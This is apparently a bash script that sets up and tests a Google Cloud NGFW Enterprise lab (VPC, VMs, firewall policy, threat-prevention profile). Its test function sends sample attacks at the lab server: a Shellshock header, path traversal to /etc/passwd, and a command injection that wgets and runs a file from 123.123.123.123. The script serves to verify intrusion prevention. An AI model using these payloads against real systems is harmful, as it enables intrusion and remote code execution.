#!/bin/bash

export project_id=$(gcloud config list --format="value(core.project)")
export org_id=$(gcloud projects get-ancestors $project_id --format="csv[no-heading](id,type)" | grep ",organization$" | cut -d"," -f1)
export region=europe-west2
export zone=europe-west2-b
export prefix=cloudngfw
export org_prefix=cloudngfw
export billing_project_id=prj-hub-x

create_security_profile() {
  gcloud network-security security-profiles threat-prevention create $org_prefix-sp-threat \
    --organization $org_id \
    --location=global
  gcloud network-security security-profile-groups create \
    $org_prefix-spg \
    --organization $org_id \
    --location=global \
    --threat-prevention-profile organizations/$org_id/locations/global/securityProfiles/$org_prefix-sp-threat
  gcloud network-security security-profiles threat-prevention list --location=global --organization $org_id
  gcloud network-security security-profile-groups list --organization $org_id --location=global
}

create_firewall_endpoint() {
  gcloud network-security firewall-endpoints create $org_prefix-$zone --zone=$zone --organization $org_id --billing-project $billing_project_id
  gcloud network-security firewall-endpoints list --zone $zone --organization $org_id
}

setup_vpc() {
  gcloud compute networks create $prefix-vpc --subnet-mode=custom
  gcloud compute networks subnets create $prefix-$region-subnet --range=10.0.0.0/24 --network=$prefix-vpc --region=$region
  gcloud compute addresses create $prefix-$region-cloudnatip --region=$region
  export cloudnatip=$(gcloud compute addresses list --filter=name:$prefix-$region-cloudnatip --format="value(address)")
  gcloud compute routers create $prefix-cr --region=$region --network=$prefix-vpc
  gcloud compute routers nats create $prefix-cloudnat-$region \
    --router=$prefix-cr --router-region $region \
    --nat-all-subnet-ip-ranges \
    --nat-external-ip-pool=$prefix-$region-cloudnatip
}

create_instances() {
  gcloud compute instances create $prefix-$zone-www \
    --subnet=$prefix-$region-subnet --no-address --zone $zone \
    --metadata startup-script='#! /bin/bash
  apt-get update
  apt-get install apache2 tcpdump iperf3 -y
  a2ensite default-ssl
  a2enmod ssl
  # Read VM network configuration:
  md_vm="http://169.254.169.254/computeMetadata/v1/instance/"
  vm_hostname="$(curl $md_vm/name -H "Metadata-Flavor:Google" )"
  filter="{print \$NF}"
  vm_network="$(curl $md_vm/network-interfaces/0/network \
  -H "Metadata-Flavor:Google" | awk -F/ "${filter}")"
  vm_zone="$(curl $md_vm/zone \
  -H "Metadata-Flavor:Google" | awk -F/ "${filter}")"
  # Apache configuration:
  echo "Page on $vm_hostname in network $vm_network zone $vm_zone" | \
  tee /var/www/html/index.html
  systemctl restart apache2'

  gcloud compute instances create $prefix-$zone-client \
    --subnet=$prefix-$region-subnet --no-address --zone $zone \
    --scopes=compute-ro \
    --metadata startup-script='#! /bin/bash
        apt-get update
        apt-get install apache2-utils iperf3 tcpdump -y'
}

setup_tags() {
  # export user_id=$(gcloud auth list --format="value(account)")
  # gcloud projects add-iam-policy-binding $project_id --member user:$user_id --role roles/resourcemanager.tagAdmin
  # gcloud projects add-iam-policy-binding $project_id --member user:$user_id --role roles/resourcemanager.tagUser
  gcloud resource-manager tags keys create $prefix-vpc-tags \
    --parent projects/$project_id \
    --purpose GCE_FIREWALL \
    --purpose-data network=$project_id/$prefix-vpc
  gcloud resource-manager tags values create $prefix-vpc-client --parent=$project_id/$prefix-vpc-tags
  gcloud resource-manager tags values create $prefix-vpc-server --parent=$project_id/$prefix-vpc-tags
  gcloud resource-manager tags values create $prefix-vpc-quarantine --parent=$project_id/$prefix-vpc-tags
  gcloud resource-manager tags bindings create \
    --location $zone \
    --tag-value $project_id/$prefix-vpc-tags/$prefix-vpc-server \
    --parent //compute.googleapis.com/projects/$project_id/zones/$zone/instances/$prefix-$zone-www
  gcloud resource-manager tags bindings create \
    --location $zone \
    --tag-value $project_id/$prefix-vpc-tags/$prefix-vpc-client \
    --parent //compute.googleapis.com/projects/$project_id/zones/$zone/instances/$prefix-$zone-client
}

setup_firewall_policy() {
  gcloud compute network-firewall-policies create \
    $prefix-fwpolicy --description \
    "Cloud NGFW Enterprise" --global
  gcloud compute network-firewall-policies rules create 100 \
    --description="block quarantined workloads" \
    --action=deny \
    --firewall-policy=$prefix-fwpolicy \
    --global-firewall-policy \
    --layer4-configs=all \
    --direction=EGRESS \
    --target-secure-tags $project_id/$prefix-vpc-tags/$prefix-vpc-quarantine \
    --dest-ip-ranges=0.0.0.0/0
  gcloud compute network-firewall-policies rules create 1000 \
    --description="allow http traffic from health-checks ranges" \
    --action=allow \
    --firewall-policy=$prefix-fwpolicy \
    --global-firewall-policy \
    --layer4-configs=tcp:80,tcp:443 \
    --direction=INGRESS \
    --target-secure-tags $project_id/$prefix-vpc-tags/$prefix-vpc-server \
    --src-ip-ranges=35.191.0.0/16,130.211.0.0/22,209.85.152.0/22,209.85.204.0/22
  gcloud compute network-firewall-policies rules create 2000 \
    --description="allow ssh traffic from identity-aware-proxy ranges" \
    --action=allow \
    --firewall-policy=$prefix-fwpolicy \
    --global-firewall-policy \
    --layer4-configs=tcp:22 \
    --direction=INGRESS \
    --src-ip-ranges=35.235.240.0/20
  gcloud compute network-firewall-policies rules create 3000 \
    --description="block ingress traffic from sanctioned countries, known malicious IPs and ToR exit nodes" \
    --action=deny \
    --firewall-policy=$prefix-fwpolicy \
    --global-firewall-policy \
    --layer4-configs=all \
    --direction=INGRESS \
    --src-region-codes CU,IR,KP,SY,XC,XD \
    --src-threat-intelligence iplist-tor-exit-nodes,iplist-known-malicious-ips
  gcloud compute network-firewall-policies rules create 4000 \
    --description="block egress traffic from sactioned countries, known malicious IPs and ToR exit nodes" \
    --action=deny \
    --firewall-policy=$prefix-fwpolicy \
    --global-firewall-policy \
    --layer4-configs=all \
    --direction=EGRESS \
    --dest-region-codes CU,IR,KP,SY,XC,XD \
    --dest-threat-intelligence iplist-tor-exit-nodes,iplist-known-malicious-ips
  gcloud compute network-firewall-policies rules create 5000 \
    --description "allow system updates" \
    --action=allow \
    --firewall-policy=$prefix-fwpolicy \
    --global-firewall-policy \
    --layer4-configs=tcp:80,tcp:443 \
    --direction=EGRESS \
    --dest-fqdns=ftp.us.debian.org,debian.map.fastly.net,packages.cloud.google.com,www3.l.google.com
  gcloud compute network-firewall-policies rules create 6000 \
    --description "allow ingress internal traffic from clients" \
    --action=allow \
    --firewall-policy=$prefix-fwpolicy \
    --global-firewall-policy \
    --direction=INGRESS \
    --enable-logging \
    --layer4-configs all \
    --src-ip-ranges=10.0.0.0/24 \
    --target-secure-tags $project_id/$prefix-vpc-tags/$prefix-vpc-server
  gcloud compute network-firewall-policies rules create 7000 \
    --description "allow ingress external traffic to server" \
    --action=allow \
    --firewall-policy=$prefix-fwpolicy \
    --global-firewall-policy \
    --layer4-configs=tcp:80,tcp:443 \
    --direction=INGRESS \
    --enable-logging \
    --src-ip-ranges=$cloudnatip \
    --target-secure-tags $project_id/$prefix-vpc-tags/$prefix-vpc-server
  gcloud compute network-firewall-policies rules create 10000 \
    --description "inspect all egress internet traffic from clients" \
    --action=apply_security_profile_group \
    --firewall-policy=$prefix-fwpolicy \
    --global-firewall-policy \
    --layer4-configs=tcp:80,tcp:443 \
    --direction=EGRESS \
    --dest-ip-ranges=0.0.0.0/0 \
    --enable-logging \
    --target-secure-tags $project_id/$prefix-vpc-tags/$prefix-vpc-client \
    --security-profile-group=//networksecurity.googleapis.com/organizations/$org_id/locations/global/securityProfileGroups/$org_prefix-spg
  gcloud compute network-firewall-policies associations create \
    --firewall-policy $prefix-fwpolicy \
    --network $prefix-vpc \
    --name $prefix-fwpolicy-association \
    --global-firewall-policy
}

setup_load_balancer() {
  gcloud compute addresses create $prefix-$region-nlbip --region=$region
  gcloud compute instance-groups unmanaged create $prefix-ig --zone $zone
  gcloud compute instance-groups unmanaged add-instances $prefix-ig --instances $prefix-$zone-www --zone $zone
  gcloud compute health-checks create http $prefix-$region-hc-http80 --region $region --port 80
  gcloud compute backend-services create $prefix-nlb-bes \
    --protocol TCP \
    --health-checks $prefix-$region-hc-http80 \
    --health-checks-region $region \
    --region $region
  gcloud compute backend-services add-backend $prefix-nlb-bes \
    --instance-group $prefix-ig \
    --instance-group-zone $zone \
    --region $region
  gcloud compute forwarding-rules create $prefix-nlb-ipv4 \
    --load-balancing-scheme EXTERNAL \
    --region $region \
    --ports 80 \
    --address $prefix-$region-nlbip \
    --backend-service $prefix-nlb-bes
}

associate_firewall_endpoint() {
  check_deployment_state=$(gcloud network-security firewall-endpoints list --zone $zone --organization $org_id --format="value(state)")
  echo "Deployment state: $check_deployment_state"
  if [ "$check_deployment_state" == "ACTIVE" ]; then
    gcloud network-security firewall-endpoint-associations create \
      $prefix-association --zone $zone \
      --network=$prefix-vpc --endpoint $org_prefix-$zone \
      --organization $org_id
  else
    echo "Deployment state is not READY"
  fi
  check_association_state=$(gcloud network-security firewall-endpoint-associations list --format="value(state)")
  echo "Association state: $check_association_state"
  # if check_association_state is not ACTIVE, loop every 30 seconds and display the state until it is ACTIVE

  while [ "$check_association_state" != "ACTIVE" ]; do
    sleep 30
    check_association_state=$(gcloud network-security firewall-endpoint-associations list --format="value(state)")
    echo "Association state: $check_association_state"
  done
}

test_on_client_gce_instance() {
  export region=europe-west2
  export zone=europe-west2-b
  export prefix=cloudngfw
  export target_privateip=$(gcloud compute instances list --filter=name:$prefix-$zone-www --format="value(networkInterfaces.networkIP)")
  export target_nlbip=$(gcloud compute addresses list --filter=name:$prefix-$region-nlbip --format="value(address)")
  echo target_private_ip = $target_privateip
  echo target_nlb_ip = $target_nlbip
  curl $target_privateip --max-time 2
  curl $target_nlbip --max-time 2

  curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://$target_privateip/cgi-bin/test-critical -m 3
  curl http://$target_privateip/cgi-bin/../../../..//bin/cat%20/etc/passwd -m 3
  curl http://$target_privateip/?item=../../../../WINNT/win.ini -m 3
  curl "http://$target_privateip/weblogin.cgi?username=admin' -m 3;cd /tmp;wget http://123.123.123.123/evil --tries 2 -T 3;sh evil;rm evil"

  curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://$target_nlbip/cgi-bin/test-critical -m 3
  curl http://$target_nlbip/cgi-bin/../../../..//bin/cat%20/etc/passwd -m 3
  curl http://$target_nlbip/?item=../../../../WINNT/win.ini -m 3
  curl "http://$target_nlbip/weblogin.cgi?username=admin' -m 3;cd /tmp;wget http://123.123.123.123/evil --tries 2 -T 3;sh evil;rm evil"
}

update_firewall_policy() {
  gcloud compute network-firewall-policies rules update 6000 \
    --action=apply_security_profile_group \
    --firewall-policy=$prefix-fwpolicy \
    --enable-logging \
    --global-firewall-policy \
    --security-profile-group=//networksecurity.googleapis.com/organizations/$org_id/locations/global/securityProfileGroups/$org_prefix-spg
  gcloud compute network-firewall-policies rules update 7000 \
    --action=apply_security_profile_group \
    --firewall-policy=$prefix-fwpolicy \
    --enable-logging \
    --global-firewall-policy \
    --security-profile-group=//networksecurity.googleapis.com/organizations/$org_id/locations/global/securityProfileGroups/$org_prefix-spg
  gcloud compute network-firewall-policies rules describe 6000 \
    --firewall-policy=$prefix-fwpolicy \
    --global-firewall-policy
  gcloud compute network-firewall-policies rules describe 7000 \
    --firewall-policy=$prefix-fwpolicy \
    --global-firewall-policy
}

# create_security_profile
# create_firewall_endpoint
# setup_vpc
# create_instances
# setup_tags
# setup_firewall_policy
# setup_load_balancer
# associate_firewall_endpoint
update_firewall_policy
